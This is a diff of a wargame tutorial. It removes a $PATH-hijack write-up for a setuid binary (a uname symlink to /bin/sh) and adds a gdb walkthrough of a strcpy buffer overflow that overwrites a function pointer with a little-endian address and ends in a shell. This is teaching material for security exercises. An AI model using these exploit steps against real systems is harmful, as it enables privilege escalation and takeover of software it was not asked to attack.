@@ -1,30 +1,182 @@
-In this level you had to exploit the fact, that if no absolute path is specified,
-the system searches in the $PATH locations for it. Because the setuid binary
-didn't use absoliute paths, it was possible to change the environment $PATH
-variable. One of the first commands executed is `uname`. So we use a symlink
-called uname to `/bin/sh`.
+Level 5 recap
+-------------
+In the previous level you exploited a buffer overflow in 'main()', where the goal
+was to overwrite the function pointer 'function_ptr' with the address of the
+function 'target_function'. One important aspect to understand here is how the
+stack works. For a demonstration of how this could be solved, see the demo
+section.
 
-    ln -s /bin/sh uname
 
-If we now set $PATH only to the current working directory "." the system will
-search for the `uname` program and will only find the symlink. So it will execute
-the shell for us.
+The stack
+---------
+The stack is a data structure located in a process' memory. The stack contains,
+the context of the current executing function, including local function variables.
+Local stack variables are placed in what is called a "stack frame".
+Upon every call to a function, a chunk of memory is allocated at the top of the
+stack. The size of this chunk of memory is called a
+stack frame, and the size of the stack frame depends on the amount of space a
+function needs to hold its local variables. When a new functin call is made, a
+new stack frame is "pushed" to the top of the stack, growing the size of the
+stack. When a function returns, the top stack frame is "popped" from the top of
+the stack, restoring the stack context of the calling function.
+A simplified view of the stack frame belonging to 'main' looks like this:
 
-    level4@gracker:/tmp/level4$ echo $PATH
-    /sbin/:/usr/local/bin:/usr/bin:/bin:/usr/games
+ main() stack frame                    | Address
++--------------------------------------+
+| buffer (32 bytes)                    | 0xbf00
+| function_ptr (4 bytes)               | 0xbf20
+| other function data (varying size)   | 0xbf24
++--------------------------------------+
 
-    level4@gracker:/tmp/level4$ env PATH=. /matrix/level4/level4
-    Zero Cool - Linux Information Gathering Tool v1.2
+You will learn what "other function data" is in a later level, what is
+interesting to us now is buffer and function_ptr.
+Notice that the buffer array is located at a lower address than function_ptr.
+If data is copied into buffer, without bounds checking, it could overflow into
+the adjacent variable, which in this case would be 'function_ptr'.
+Since the 'strcpy(3)' function does not perform bounds checking, nothing
+prevents us from overflowing buffer, and allowing us to hijack execution flow by
+controlling the value of function_ptr.
 
-    [*] Get system information:
-    $ PATH=/sbin/:/usr/local/bin:/usr/bin:/bin:/usr/games
-    $ id
-    uid=1005(level5) gid=1004(level4) groups=1004(level4)
 
-Because the $PATH is now screwed, we have to reset it back to the original value,
-otherwise no other commands will work.
+Demo
+----
+Let us disassemble main and find find the offset from buffer to function_ptr
+    $ gdb -q level08
+    Reading symbols from level08...(no debugging symbols found)...done.
+    (gdb) set disassembly-flavor intel
+    (gdb) disas main
+    Dump of assembler code for function main:
+       0x08048613 <+0>:lea    ecx,[esp+0x4]
+       0x08048617 <+4>:and    esp,0xfffffff0
+       0x0804861a <+7>:push   DWORD PTR [ecx-0x4]
+       0x0804861d <+10>:push   ebp
+       0x0804861e <+11>:mov    ebp,esp
+       0x08048620 <+13>:push   ecx
+       0x08048621 <+14>:sub    esp,0x34
+       0x08048624 <+17>:mov    eax,ecx
+       0x08048626 <+19>:mov    DWORD PTR [ebp-0xc],0x80485fa
+       0x0804862d <+26>:cmp    DWORD PTR [eax],0x2
+       0x08048630 <+29>:je     0x8048652 <main+63>
+       0x08048632 <+31>:mov    eax,DWORD PTR [eax+0x4]
+       0x08048635 <+34>:mov    eax,DWORD PTR [eax]
+       0x08048637 <+36>:sub    esp,0x8
+       0x0804863a <+39>:push   eax
+       0x0804863b <+40>:push   0x8048742
+       0x08048640 <+45>:call   0x8048400 <printf@plt>
+       0x08048645 <+50>:add    esp,0x10
+       0x08048648 <+53>:sub    esp,0xc
+       0x0804864b <+56>:push   0x1
+       0x0804864d <+58>:call   0x8048460 <exit@plt>
+       0x08048652 <+63>:mov    eax,DWORD PTR [eax+0x4]
+       0x08048655 <+66>:add    eax,0x4
+       0x08048658 <+69>:mov    eax,DWORD PTR [eax]
+       0x0804865a <+71>:sub    esp,0x8
+       0x0804865d <+74>:push   eax
+       0x0804865e <+75>:lea    eax,[ebp-0x2c]  <--- buffer location (ebp-0x2c)
+       0x08048661 <+78>:push   eax
+       0x08048662 <+79>:call   0x8048430 <strcpy@plt>
+       0x08048667 <+84>:add    esp,0x10
+       0x0804866a <+87>:sub    esp,0x8
+       0x0804866d <+90>:push   0x804859b
+       0x08048672 <+95>:push   0x8048755
+       0x08048677 <+100>:call   0x8048400 <printf@plt>
+       0x0804867c <+105>:add    esp,0x10
+       0x0804867f <+108>:sub    esp,0x8
+       0x08048682 <+111>:push   DWORD PTR [ebp-0xc]
+       0x08048685 <+114>:push   0x804876f
+       0x0804868a <+119>:call   0x8048400 <printf@plt>
+       0x0804868f <+124>:add    esp,0x10
+       0x08048692 <+127>:mov    eax,DWORD PTR [ebp-0xc] <-- function_ptr location (ebp-0xc)
+       0x08048695 <+130>:call   eax
+       0x08048697 <+132>:mov    eax,0x0
+       0x0804869c <+137>:mov    ecx,DWORD PTR [ebp-0x4]
+       0x0804869f <+140>:leave
+       0x080486a0 <+141>:lea    esp,[ecx-0x4]
+       0x080486a3 <+144>:ret
+    End of assembler dump.
+    (gdb) break *main+78
+    Breakpoint 1 at 0x8048661
+    (gdb) break *main+127
+    Breakpoint 2 at 0x8048692
+    (gdb) r "this will go into argv[1]"
+    Starting program: /syshome/narhen/level08 "this will go into argv[1]"
 
-This kind of exploit is or was a real issue. Not only for linux commandline $PATH,
-but also for DLLs in Windows or Dylib (dynamic libraries) in OSX.
-Read this paper for more details:
-https://www.virusbtn.com/virusbulletin/archive/2015/03/vb201503-dylib-hijacking
+    Breakpoint 1, 0x08048661 in main ()
+    (gdb) x/2i 
+    => 0x8048661 <main+78>:push   eax
+       0x8048662 <main+79>:call   0x8048430 <strcpy@plt>
+    (gdb) i r eax
+    eax            0xffffdbac  -9300
+
+As we can see from the eax register the buffer array is located at address 0xffffdbac 
+
+    (gdb) c
+    Continuing.
+    Target function is at 0x804859b
+    Calling 0x80485fa
+
+    Breakpoint 2, 0x08048692 in main ()
+    (gdb) x/2i 
+    => 0x8048692 <main+127>:mov    eax,DWORD PTR [ebp-0xc]
+       0x8048695 <main+130>:call   eax
+    (gdb) p $ebp -0xc
+     = (void *) 0xffffdbcc
+
+As we can see the function_ptr is located at address 0xffffdbcc
+
+    (gdb) p 0xffffdbcc - 0xffffdbac
+     = 32
+
+Calculating the difference, we get the offset of 32 bytes. Great! Now we know
+that by writing 32 + 4 bytes, we can overwrite the function_ptr starting from
+the 33 byte. Let us prove this to ourselves
+
+    $ python
+    Python 3.6.1 (default, Mar 27 2017, 00:27:06)
+    [GCC 6.3.1 20170306] on linux
+    Type "help", "copyright", "credits" or "license" for more information.
+    >>> print("A"*32+"B"*4)
+    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
+    >>>
+     gdb -q ./level08
+    Reading symbols from ./level08...(no debugging symbols found)...done.
+    (gdb) r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
+    Starting program: /syshome/narhen/level08 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
+    Target function is at 0x804859b
+    Calling 0x42424242
+
+    Program received signal SIGSEGV, Segmentation fault.
+    0x42424242 in ?? ()
+
+Nice! We proved this worked because the it tried to execute a function at
+address 0x42424242 which, in ascii is "BBBB" (the integer value of 'B' is 0x42)
+Now let ut try the address of the target_function
+
+    (gdb) r $(printf "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x08\x04\x85\x9b")
+    Starting program: /syshome/narhen/level08 $(printf
+    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x08\x04\x85\x9b")
+    Target function is at 0x804859b
+    Calling 0x9b850408
+
+    Program received signal SIGSEGV, Segmentation fault.
+    0x9b850408 in ?? ()
+
+By replacing the "BBBB" part of our payload with the address of the target
+function, it should have been executed, but instead it tried to execute
+something at address 0x9b850408. It seems that our address somehow got reversed.
+This is because of how values are represented on little endian architectures [1].
+We need to inupt the address reversed, so that it will be represented correctly
+in memory:
+
+    (gdb) r $(printf "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x9b\x85\x04\x08")
+    The program being debugged has been started already.
+    Start it from the beginning? (y or n) y
+    Starting program: /syshome/narhen/level08 $(print "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x9b\x85\x04\x08")f
+    Target function is at 0x804859b
+    Calling 0x804859b
+    sh-4.4$
+
+WIN!
+
+---
+[1] https://en.wikipedia.org/wiki/Endianness
